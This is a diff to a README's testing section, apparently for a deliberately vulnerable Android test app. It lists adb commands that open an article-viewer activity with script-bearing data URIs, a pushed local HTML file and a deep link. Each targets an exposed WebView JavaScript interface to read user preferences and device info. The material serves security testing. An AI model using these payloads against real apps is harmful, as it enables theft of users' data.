@@ -15,12 +15,17 @@
 ## Testing
 
 ```bash
-# Test with malicious HTML file that exploits JavaScript interface
-adb shell am start -n co.ostorlab.myapplication/.ArticleViewerActivity -e url "file:///android_asset/malicious.html"
+# Test with external HTML file (not bundled with app)
+# First, push your test HTML file to the device:
+adb push test_exploit.html /sdcard/test_exploit.html
+adb shell am start -n co.ostorlab.myapplication/.ArticleViewerActivity -e url "file:///sdcard/test_exploit.html"
 
-# Test with malicious URL that contains JavaScript exploitation
+# Test with data URI that contains JavaScript exploitation
 adb shell am start -n co.ostorlab.myapplication/.ArticleViewerActivity -e url "data:text/html,<script>alert(NewsReader.getUserPreferences())</script>"
 
-# Test device info extraction
+# Test device info extraction via data URI
 adb shell am start -n co.ostorlab.myapplication/.ArticleViewerActivity -e url "data:text/html,<script>alert(NewsReader.getDeviceInfo())</script>"
+
+# Test via deep link (most realistic attack vector)
+adb shell am start -d "newsreader://article?url=data:text/html,<script>console.log(NewsReader.getUserPreferences())</script>&title=News"
 ```
